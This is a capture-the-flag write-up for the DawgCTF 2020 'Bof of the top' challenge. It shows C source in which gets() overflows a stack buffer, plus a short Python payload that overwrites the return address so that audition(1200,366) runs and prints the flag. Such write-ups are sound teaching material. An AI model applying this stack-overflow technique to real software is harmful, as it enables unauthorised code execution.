## Bof of the top 

### Description

> Anything it takes to climb the ladder of success
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4000
>
> Author: trashcanna


### Attachment

[bof](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/bof/bof) & [bof](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/bof/bof.c)

### Analysis

buffer overflow while `gets(song)` in `get_audition_info`:

```c
void get_audition_info(){
	char name[50];
	char song[50];
	printf("What's your name?\n");
	gets(name);
	printf("What song will you be singing?\n");
	gets(song);
}
```

and we can print flag by calling `audition(1200,366)`:

```c
// gcc -m32 -fno-stack-protector -no-pie bof.c -o bof

void audition(int time, int room_num){
	char* flag = "/bin/cat flag.txt";
	if(time == 1200 && room_num == 366){
		system(flag);
	}
}
```


### Solution

```python
audition = 0x08049182

offset = cyclic_find('daab')
payload = 'A'*offset
payload += p32(audition) + p32(0xdeadbeef) + p32(1200) + p32(366)

sla("What's your name?\n",'TaQini')
sla('What song will you be singing?\n',payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/bof) 


